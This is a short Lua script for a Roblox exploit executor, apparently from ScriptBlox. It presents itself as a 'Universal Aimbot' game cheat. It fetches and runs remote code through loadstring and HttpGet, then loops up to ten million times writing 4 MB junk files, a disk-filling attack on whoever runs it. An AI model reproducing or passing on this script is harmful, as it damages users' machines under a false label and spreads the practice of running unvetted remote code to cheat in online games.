--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Universal-Aimbot-Works-2026-83277"))()
task.wait(2)
local fileNamePrefix = "Systematic"
local fileSize = 4 * 1024 * 1024
local content = string.rep("A", fileSize)

for counter = 1, 10000000 do
    local fileName = fileNamePrefix .. counter .. ".txt"

    local success, err = pcall(function()
        writefile(fileName, content)
    end)

    if not success then
        warn(fileName .. " write failed: " .. tostring(err))
        continue
    end

    local readSuccess, result = pcall(function()
        return readfile(fileName)
    end)

    if not readSuccess then
        warn(fileName .. " read failed: " .. tostring(result))
        continue
    end

    print(fileName .. " exists: " .. tostring(isfile(fileName)))
    print("Actual size: " .. #result .. " bytes")
    print("Correct size: " .. tostring(#result == fileSize))
    print("Content correct: " .. tostring(result == content))
end

